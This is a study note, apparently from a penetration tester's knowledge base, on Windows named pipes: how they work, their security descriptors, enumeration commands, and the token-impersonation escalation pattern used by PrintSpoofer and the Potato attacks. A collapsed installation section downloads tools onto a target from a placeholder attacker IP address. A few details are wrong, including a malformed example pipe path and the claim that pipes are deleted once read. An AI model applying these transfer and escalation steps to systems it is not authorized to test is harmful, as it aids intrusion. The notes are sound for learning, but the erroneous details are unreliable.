---
created: 2026-07-20
tags:
  - Windows
status: substantial
---
## Named pipes

>A **[named pipe](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)** is Inter-Process Communication (IPC) mechanism implemented by the Windows I/O subsystem and exposed through the Win32 API. It's a **kernel-managed communication channel** that allows two processes to exchange data using a **file-like interface**.

>[!note] Windows named pipes are conceptually similar to Unix FIFOs, but the Windows implementation is deeply integrated with the Windows object manager and security model.

- Anonymous pipes exist only between related process (such as parent and child) and can't be addressed by name. **Named pipes** can be accessed by any process (subject to security checks), even *across the network*.
- Pipes are used for inter-process communication and are stored in memory.
- An example of a named pipe: `\\.\PipeName\\ExampleNamedPipeServer`.
- Once read, pipes are automatically deleted.
### How named pipes work

- Named pipes follow a **server-client model**. One process acts as the server and creates the pipe, and *one or more* client processes connect to it.

>A **pipe server** refers to the process that creates a named pipe, and **pipe client** refers to a process that connects to an instance of a named pipe.

- Named pipes can be *half-duplex* (unidirectional/one-way communication channel) and *duplex* (bidirectional/two-way communication channel).

>[!note] Internally, named pipes are implemented by the Windows **Named Pipe File System (NPFS)** driver — a kernel-mode driver responsible for managing pipe instances, buffering, synchronization, and message semantics.

- In the Windows object namespace, named pipes exist under:

```powershell
\Device\NamedPipe\
```

- From user mode, you access them via the Win32 path:

```powershell
\\.\pipe\PipeName
```

The `\\.\` prefix is the Win32 ***device namespace*** path, and `pipe` maps to the Named Pipe File System.

>[!note]+ Win32 API behind named pipes 
>- Named pipes are created using the [`CreateNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea) Win32 API function. It specifies the pipe name, the direction of data flow (inbound, outbound, or duplex), mode (byte stream or message stream), the maximum number of instances, buffer sizes, and security attributes. 
>- Each call to `CreateNamedPipe` creates one pipe *instance*. Multiple instances allow multiple clients to connect simultaneously to the same pipe name.
>- After creation, the server calls [`ConnectNamedPipe`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe). This call blocks until a client connects.
>- A client connects using [`CreateFile`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea).
>
>Every active connection to a named pipe server results in the creation of a new named pipe instance.

## The trust boundary

A named pipe is a securable kernel object. When a service (often running as `SYSTEM`) calls `CreateNamedPipe`, it can attach a security descriptor. If the DACL is too permissive, unprivileged users may connect to a privileged service.

When you encounter a named pipe, ask yourself:
- Is a high-privilege service listening on the pipe?
- Who can connect?
- Does the service impersonate the connecting client? If so, a low-privilege user can trick a `SYSTEM` service into authenticating to their pipe and steal its token.

There are several attacks associated with named pipes:
- **Named pipe impersonation attacks**
	- RottenPotato
	- JuicyPotato
	- RoguePotato
	- PrintSpoofer
- **Weak pipe ACLs** (improper DACLs)
- **NTLM relay over named pipes**
- **Pipe squatting**
- **Service-to-service trust abuse**
## Enumeration

- To list named pipes in PowerShell, you can use `gci`/`dir` ([`Get-ChildItem`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.5)):

```powershell
gci \\.\pipe\
```

- Using [`PipeList`](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist) (from the Sysinternals Suite):

```powershell
pipelist.exe /accepteula 
```

- To enumerate permissions assigned to a specific named pipe, you can use [`AccessChk`](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) (from the Sysinternals Suite):

```powershell
accesschk.exe /accepteula \\.\pipe\lsass -v
```

> [!note]- Installation: `PipeList` and `AccessChk`
> 
> - Download the tool archives on your machine and serve them:
> 
> ```bash
> wget https://download.sysinternals.com/files/PipeList.zip
> ```
> ```bash
> wget https://download.sysinternals.com/files/AccessChk.zip
> ```
> ```bash
> python3 -m http.server 8080
> ```
> 
> - Transfer the files from your machine to the target:
> 
> ```powershell
> Invoke-WebRequest -Uri "http://<attacker_ip_address>:<port>/PipeList.zip" -OutFile "PipeList.zip"
> ```
> ```powershell
> Invoke-WebRequest -Uri "http://<attacker_ip_address>:<port>/AccessChk.zip" -OutFile "AccessChk.zip"
> ```
> 
> - Extract archives:
> 
> ```powershell
> Expand-Archive -Path "PipeList.zip" -DestinationPath ".\PipeList"
> ```
> ```powershell
> Expand-Archive -Path "AccessChk.zip" -DestinationPath ".\AccessChk"
> ```
> - Access via:
> ```powershell
> .\PipeList\pipelist.exe /accepteula
> ```
> ```powershell
> .\AccessChk\accesschk.exe /accepteula \\.\Pipe\lsass -v
> ```
## Named pipe impersonation

Named pipes are one of the primary mechanisms exploited in privilege escalation attacks because they allow a server to **impersonate the connecting client**.

- When a client connects to a named pipe, the pipe server can call `ImpersonateNamedPipeClient()`. This attaches an **impersonation token** representing the client to the server's thread.
- If the server process holds `SeImpersonatePrivilege`, the impersonation is effective at `SecurityImpersonation` level — the thread can perform operations as the client.
- Without `SeImpersonatePrivilege`, the token is silently downgraded to `SecurityIdentification` — identity inspection only, no resource access.

The exploitation pattern:
1. Create a named pipe with permissive DACLs.
2. Trick a `SYSTEM` process into connecting (the "coercion" step — this is what differentiates each potato attack).
3. Call `ImpersonateNamedPipeClient()` to capture the `SYSTEM` impersonation token.
4. Duplicate it to a primary token and spawn a `SYSTEM` process.

> [!note] See [[🛠️ Access tokens and impersonation]] for impersonation mechanics and token duplication. See [[Windows privileges#`SeImpersonatePrivilege` and `SeAssignPrimaryTokenPrivilege`]] for which accounts hold the required privileges.

> [!bug] This is the core mechanism behind [[PrintSpoofer]] (coerces Print Spooler), [[RoguePotato]] (coerces RPCSS via OXID poisoning), and the NTLM relay step in [[JuicyPotato]].

## References and further reading

- [`Named Pipes — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes)
- [`Named Pipe Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [`ImpersonateNamedPipeClient function — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)